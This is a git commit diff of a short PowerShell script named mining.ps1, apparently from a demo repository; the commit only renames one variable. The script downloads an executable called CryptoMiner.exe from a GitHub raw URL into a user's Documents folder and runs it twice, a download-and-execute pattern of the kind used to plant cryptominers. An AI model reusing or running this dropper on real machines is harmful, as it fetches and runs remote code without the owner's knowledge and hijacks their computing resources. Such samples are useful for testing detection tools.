12f9a83ab9f02eeba7b8a6f3bbc893aeb3ff8a19
tmmdemo <37916298+tmmdemo@users.noreply.github.com>
2018-09-24 15:56:43 -0500

    Update mining.ps1

--- mining.ps1
+++ mining.ps1
@@ -1,7 +1,7 @@
-$URL = "https://raw.githubusercontent.com/tmmdemo/automate/master/CryptoMiner.exe"
+$sven = "https://raw.githubusercontent.com/tmmdemo/automate/master/CryptoMiner.exe"
 $DEST = "c:\Users\Admin\My Documents\CryptoMiner.exe"
 $web = New-Object -TypeName System.Net.WebClient
-$web.DownloadFile($URL,$DEST)
+$web.DownloadFile($sven,$DEST)
 $exe = "c:\Users\Admin\My Documents\CryptoMiner.exe"
 & $exe
 & $exe
